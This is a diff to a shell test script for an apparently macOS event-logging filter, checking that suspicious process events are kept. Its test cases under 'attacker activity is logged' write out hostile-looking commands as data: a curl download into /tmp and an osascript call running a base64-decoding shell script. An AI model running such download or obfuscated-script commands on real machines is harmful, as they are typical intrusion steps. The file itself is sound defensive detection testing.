@@ -18,10 +18,9 @@ ev() { jq -cn --arg pp "$1" --argjson pplat "$2" --arg pt "$3" --arg tp "$4" --a
       env:["PATH=/usr/bin","SECRET_TOKEN=zzz","XPC_SERVICE_NAME=0"], fds:[]}}}'; }
 t() { local want="$1" name="$2"; shift 2
   local got; got=$(ev "$@" | jq -n -cR --argjson cfg "$CFG" -f "$ROOT/src/scope.jq" | wc -l | tr -d ' ')
-  local g=$([ "$got" = 1 ] && echo KEEP || echo DROP)
+  local g; g=$([ "$got" = 1 ] && echo KEEP || echo DROP)
   if [ "$g" = "$want" ]; then pass=$((pass+1)); printf "  ok   %-4s %s\n" "$g" "$name"
   else fail=$((fail+1)); printf "  FAIL want %s got %s  %s\n" "$want" "$g" "$name"; fi; }
-L=/sbin/launchd; T=/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
 echo "-- attacker activity is logged"
 t KEEP "curl download to tmp"            /bin/zsh true "" /usr/bin/curl true "" '["curl","-o","/tmp/a","https://x/y/z"]'
 t KEEP "osascript base64"                /bin/zsh true "" /usr/bin/osascript true "" '["osascript","-e","run script (do shell script \"echo aGk= | base64 -D\")"]'
